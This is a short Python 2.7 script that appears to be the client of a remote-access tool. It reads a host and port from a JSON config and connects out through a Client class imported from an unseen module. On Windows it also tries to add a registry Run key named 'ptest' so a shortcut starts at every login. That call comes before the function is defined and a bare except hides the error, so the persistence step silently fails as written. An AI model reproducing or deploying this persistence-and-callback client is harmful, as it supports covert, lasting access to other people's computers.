#!/usr/bin/python2.7
import json
import re
import os
from objects import *

try:
    import _winreg
    windows_setup()
except:
    pass

pythonfile = re.compile('\w*\.py$')
config_file = pythonfile.sub('client_config.json', os.path.realpath(__file__))
config = json.loads(file.read(open(config_file)))

HOST = config['HOST']
PORT = config['PORT']


def windows_setup():
    key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER,
                          'Software\Microsoft\Windows\CurrentVersion\Run',
                          0, _winreg.KEY_SET_VALUE)
    _winreg.SetValueEx(key, 'ptest', 0, _winreg.REG_SZ,
                       "C:\Python27\Scripts\main.lnk")
    key.Close()


if __name__ == "__main__":
    Client(HOST, PORT).run()
